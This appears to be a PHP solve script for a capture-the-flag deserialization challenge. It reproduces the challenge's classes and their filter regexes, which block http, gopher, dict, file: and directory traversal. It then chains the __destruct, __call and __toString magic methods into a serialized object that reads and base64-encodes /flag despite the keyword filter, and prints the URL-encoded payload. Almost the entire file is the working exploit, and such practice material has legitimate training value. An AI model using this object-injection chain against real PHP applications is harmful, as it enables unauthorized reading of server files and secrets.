<?php

class Show
{
    public $source="/flag";
    public $str;
    public function __construct($file)
    {
        $text= $this->source;
        $text = base64_encode(file_get_contents($text));
        return $text;
    }
    public function __toString()
    {
        $text= $this->source;
        $text = base64_encode(file_get_contents($text));
        return $text;
    }
    public function __set($key,$value)
    {
        $this->$key = $value;
    }
    public function _show()
    {
        if(preg_match('/http|https|file:|gopher|dict|\.\.|flag/i',$this->source)) {
            die('hacker!');
        } else {
            highlight_file($this->source);
        }
        
    }
    public function __wakeup()
    {
        if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {
            echo "hacker~";
            $this->source = "index.php";
        }
    }
}
class S6ow
{
    public $file; // show
    public $params;
    public function __construct()
    {
        $this->params = array();
    }
    public function __get($key)
    {
        return $this->params[$key];
    }
    public function __call($name, $arguments)
    {
        if($this->{$name})
            $this->{$this->{$name}}($arguments);
    }
    public function file_get($value)
    {
        echo $this->file; 
    }
}

class Sh0w
{
    public $test;
    public $str;

    public function __destruct()
    {
        $this->str->_show();
    }
}

$a = new Sh0w();
$b = new S6ow();
$b->file = new Show("");
$b->params = [ "_show" => "file_get"];
$a->str = $b;
echo urlencode(serialize($a));
